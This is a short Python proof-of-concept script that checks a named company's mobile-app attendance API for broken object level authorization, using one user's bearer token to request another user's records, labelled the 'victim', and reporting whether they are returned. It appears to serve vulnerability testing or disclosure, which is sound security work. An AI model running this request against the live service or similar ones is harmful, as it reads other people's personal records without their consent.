import requests

BASE_URL = "https://api.inspirertechnologies.com/api/MobileApp/GetAttendanceByUserId"

# Bearer Token belonging to User 14321
BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

headers = {
    "Authorization": f"Bearer {BEARER_TOKEN}",
    "Accept": "*/*"
}

# Test 1: Fetch own records
params_legitimate = {"userId": "14321", "date": "01-01-2026"}
res_own = requests.get(BASE_URL, headers=headers, params=params_legitimate)

# Test 2: Fetch target user records (Unauthorized)
params_victim = {"userId": "14324", "date": "01-01-2026"}
res_victim = requests.get(BASE_URL, headers=headers, params=params_victim)

print(f"Legitimate Request Status: {res_own.status_code}")
print(f"BOLA Test Request Status: {res_victim.status_code}")

if res_victim.status_code == 200 and "14324" in res_victim.text:
    print("[!] VULNERABILITY DETECTED: Broken Object Level Authorization (BOLA) present on endpoint!")
else:
    print("[+] Endpoint is secure against basic BOLA parameter tampering.")
